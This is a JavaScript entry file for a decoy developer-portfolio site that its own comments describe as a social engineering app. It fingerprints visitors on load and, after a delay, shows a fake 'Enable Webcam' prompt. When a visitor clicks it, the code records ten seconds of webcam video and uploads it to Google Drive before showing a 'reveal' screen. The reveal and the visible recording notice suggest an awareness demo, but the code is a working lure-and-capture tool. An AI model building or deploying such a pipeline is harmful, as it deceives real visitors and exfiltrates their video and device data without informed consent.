/**
 * app.js
 * ─────────────────────────────────────────────────────────────────────────────
 * Application entry point and orchestration layer.
 *
 * Responsibilities:
 *   • Boot the portfolio decoy app (typing animation, smooth scroll, etc.).
 *   • Schedule and render the social engineering overlay.
 *   • Wire user interactions to the capture → upload → reveal pipeline.
 *
 * SOLID: Open/Closed principle — each phase (fingerprint, capture, upload,
 *        reveal) is handled by its own module; app.js only coordinates them.
 * DRY  : The overlay trigger and dismissal path share one cleanup function.
 * KISS : Linear async flow; each step awaits the previous one.
 * ─────────────────────────────────────────────────────────────────────────────
 */

'use strict';

import { collectFingerprint }                    from './fingerprint.js';
import { requestCameraAccess, startRecording,
         saveLocally, stopStream }               from './capture.js';
import { uploadToDrive, isDriveConfigured }      from './upload.js';
import { showReveal }                            from './reveal.js';

// ─── Configuration ───────────────────────────────────────────────────────────

/**
 * Delay (ms) before the social engineering overlay appears.
 * Long enough for the user to interact with the decoy page first.
 */
const OVERLAY_DELAY_MS = 4_500;

// ─── Fingerprint (runs immediately, no permission needed) ─────────────────────
const fingerprintData = collectFingerprint();

// ─── Portfolio Decoy App ──────────────────────────────────────────────────────

/** Typing animation phrases for the hero section. */
const HERO_PHRASES = [
  'Full-Stack Developer',
  'UI/UX Enthusiast',
  'Open Source Contributor',
  'Problem Solver',
];

let _phraseIndex  = 0;
let _charIndex    = 0;
let _isDeleting   = false;

/**
 * Animate the typing effect on the hero role element.
 */
function runTypingAnimation() {
  const el = document.getElementById('hero-role');
  if (!el) return;

  const current = HERO_PHRASES[_phraseIndex];

  if (_isDeleting) {
    el.textContent = current.slice(0, --_charIndex);
  } else {
    el.textContent = current.slice(0, ++_charIndex);
  }

  let delay = _isDeleting ? 60 : 110;

  if (!_isDeleting && _charIndex === current.length) {
    delay = 1_800;
    _isDeleting = true;
  } else if (_isDeleting && _charIndex === 0) {
    _isDeleting  = false;
    _phraseIndex = (_phraseIndex + 1) % HERO_PHRASES.length;
    delay = 400;
  }

  setTimeout(runTypingAnimation, delay);
}

/**
 * Set up smooth-scroll for all in-page anchor links in the navbar.
 */
function initSmoothScroll() {
  document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
    anchor.addEventListener('click', (e) => {
      e.preventDefault();
      const target = document.querySelector(anchor.getAttribute('href'));
      target?.scrollIntoView({ behavior: 'smooth' });
    });
  });
}

/**
 * Animate skill bars when they enter the viewport.
 */
function initSkillBars() {
  const bars = document.querySelectorAll('.skill__fill');
  if (!bars.length) return;

  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          const bar   = entry.target;
          const level = bar.dataset.level ?? '0';
          bar.style.width = `${level}%`;
          observer.unobserve(bar);
        }
      });
    },
    { threshold: 0.3 },
  );

  bars.forEach((bar) => observer.observe(bar));
}

/**
 * Fade-in sections as they scroll into view.
 */
function initScrollReveal() {
  const sections = document.querySelectorAll('.animate-on-scroll');

  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('in-view');
        }
      });
    },
    { threshold: 0.1 },
  );

  sections.forEach((s) => observer.observe(s));
}

/**
 * Toggle the mobile hamburger menu.
 */
function initMobileMenu() {
  const toggle = document.getElementById('nav-toggle');
  const menu   = document.getElementById('nav-menu');
  if (!toggle || !menu) return;

  toggle.addEventListener('click', () => {
    const expanded = toggle.getAttribute('aria-expanded') === 'true';
    toggle.setAttribute('aria-expanded', String(!expanded));
    menu.classList.toggle('nav__menu--open');
  });

  // Close menu when a link is clicked
  menu.querySelectorAll('a').forEach((link) => {
    link.addEventListener('click', () => {
      toggle.setAttribute('aria-expanded', 'false');
      menu.classList.remove('nav__menu--open');
    });
  });
}

// ─── Social Engineering Overlay ──────────────────────────────────────────────

/**
 * Show the social engineering overlay after OVERLAY_DELAY_MS.
 * The overlay contains the fake "Enable Webcam" CTA.
 */
function scheduleOverlay() {
  setTimeout(showOverlay, OVERLAY_DELAY_MS);
}

/** Show the overlay modal. */
function showOverlay() {
  const overlay = document.getElementById('se-overlay');
  if (!overlay) return;
  overlay.removeAttribute('hidden');
  overlay.setAttribute('aria-modal', 'true');

  // Trap focus inside the modal for accessibility
  const firstFocusable = overlay.querySelector('button');
  firstFocusable?.focus();
}

/** Hide and remove the overlay from the tab-order. */
function hideOverlay() {
  const overlay = document.getElementById('se-overlay');
  if (!overlay) return;
  overlay.setAttribute('hidden', '');
  overlay.removeAttribute('aria-modal');
}

// ─── Camera Permission & Capture Flow ────────────────────────────────────────

/**
 * Fired when the user clicks the "Enable Webcam Experience" CTA.
 * Hides the overlay, then calls getUserMedia().
 */
async function onEnableWebcamClicked() {
  const permissionState = await getCameraPermissionState();
  if (permissionState === 'denied') {
    hideOverlay();
    showPermissionHelp(
      'Camera is currently blocked for this site, so the browser will not show the permission dialog. Use the camera icon in the address bar (or Site settings) to allow camera, then try again.',
    );
    return;
  }

  hideOverlay();
  showStatus('Requesting camera access…');

  await requestCameraAccess(
    onCameraGranted,
    onCameraDenied,
  );
}

/**
 * Called when the browser grants camera permission.
 * Attaches the stream to the preview element and starts recording.
 * @param {MediaStream} stream
 */
function onCameraGranted(stream) {
  // Show a live preview so the user sees the camera is active
  const preview = document.getElementById('cam-preview');
  if (preview) {
    preview.srcObject = stream;
    preview.removeAttribute('hidden');
    preview.play().catch(() => {});
  }

  showStatus('Recording in progress… (10 seconds)');
  startRecording(onRecordingComplete);
}

/**
 * Called when the browser denies camera permission.
 * Shows a graceful fallback — no bypass attempt is made.
 * @param {Error} err
 */
function onCameraDenied(err) {
  console.warn('[app] Camera denied:', err.message);

  const reason = (err?.name ?? '').toLowerCase();

  if (reason === 'securityerror') {
    showPermissionHelp(
      'Camera permission dialog cannot open because this page is not in a secure context. Use HTTPS or localhost.',
    );
    return;
  }

  if (reason === 'notfounderror' || reason === 'overconstrainederror') {
    showPermissionHelp(
      'No compatible camera device was found. Connect/enable a webcam and try again.',
    );
    return;
  }

  if (reason === 'notreadableerror') {
    showPermissionHelp(
      'Camera is currently busy (possibly used by another app/tab). Close other camera apps and try again.',
    );
    return;
  }

  if (reason === 'notallowederror') {
    showPermissionHelp(
      'Camera access was denied. If previously blocked, browsers may skip the dialog until you re-enable camera permission in site settings.',
    );
    return;
  }

  showPermissionHelp('Feature unavailable without camera access. Continue exploring the portfolio below.');
}

/**
 * Called by capture.js when the MediaRecorder finishes.
 * Triggers cloud upload then shows the reveal screen.
 *
 * @param {Blob}        blob           - The recorded webm video.
 * @param {string|null} screenshotUrl  - PNG data URL (bonus ImageCapture).
 */
async function onRecordingComplete(blob, screenshotUrl) {
  showStatus('Finalising…');

  let driveLink = null;

  if (isDriveConfigured()) {
    showStatus('Uploading to Google Drive…');
    try {
      const filename = `capture_${Date.now()}.webm`;
      const meta     = await uploadToDrive(blob, filename);
      driveLink      = meta.webViewLink ?? null;
    } catch (err) {
      console.warn('[app] Drive upload failed — falling back to local save.', err.message);
      saveLocally(blob);
    }
  } else {
    // Phase 1: no cloud configured — save locally
    saveLocally(blob);
  }

  showReveal({ videoBlob: blob, screenshotUrl, fingerprint: fingerprintData, driveLink });
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

/**
 * Update the status bar element with a message.
 * The status bar is only visible after camera permission is granted.
 * @param {string} message
 */
function showStatus(message) {
  const bar = document.getElementById('status-bar');
  if (!bar) return;
  bar.textContent = message;
  bar.removeAttribute('hidden');
}

/**
 * Show a descriptive help message in the denied banner.
 * @param {string} message
 */
function showPermissionHelp(message) {
  const banner = document.getElementById('denied-banner');
  if (banner) {
    banner.textContent = `⚠️ ${message}`;
    banner.removeAttribute('hidden');
  } else {
    showStatus(message);
  }
}

/**
 * Query the browser camera permission state when supported.
 * @returns {Promise<'granted'|'prompt'|'denied'|null>}
 */
async function getCameraPermissionState() {
  if (!navigator.permissions?.query) return null;
  try {
    const status = await navigator.permissions.query({ name: 'camera' });
    return status.state;
  } catch {
    return null;
  }
}

// ─── Initialisation ──────────────────────────────────────────────────────────

/**
 * Wire up all event listeners and kick off the portfolio experience.
 */
function init() {
  // Portfolio decoy features
  runTypingAnimation();
  initSmoothScroll();
  initSkillBars();
  initScrollReveal();
  initMobileMenu();

  // Social engineering CTA
  document.getElementById('btn-enable-webcam')?.addEventListener('click', onEnableWebcamClicked);

  // Dismiss overlay ("No thanks")
  document.getElementById('btn-dismiss-overlay')?.addEventListener('click', () => {
    hideOverlay();
    stopStream(); // No-op if stream isn't started yet
  });

  // Schedule the overlay appearance
  scheduleOverlay();
}

// Run after the DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}
